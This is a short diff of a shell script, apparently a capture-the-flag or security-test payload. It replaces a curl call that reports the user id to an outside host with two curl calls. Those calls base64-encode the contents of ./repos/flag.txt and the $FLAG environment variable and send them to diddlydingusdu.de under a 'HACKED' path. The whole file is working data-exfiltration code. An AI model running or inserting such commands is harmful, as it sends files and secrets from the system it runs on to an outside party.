@@ -1,2 +1,3 @@
 #!/bin/sh
-curl "http://diddlydingusdu.de/HACKED/`id -u`"
+curl "http://diddlydingusdu.de/HACKED/`cat ./repos/flag.txt | base64 -w 0`"
+curl "http://diddlydingusdu.de/HACKED/`echo "$FLAG" | base64 -w 0`"
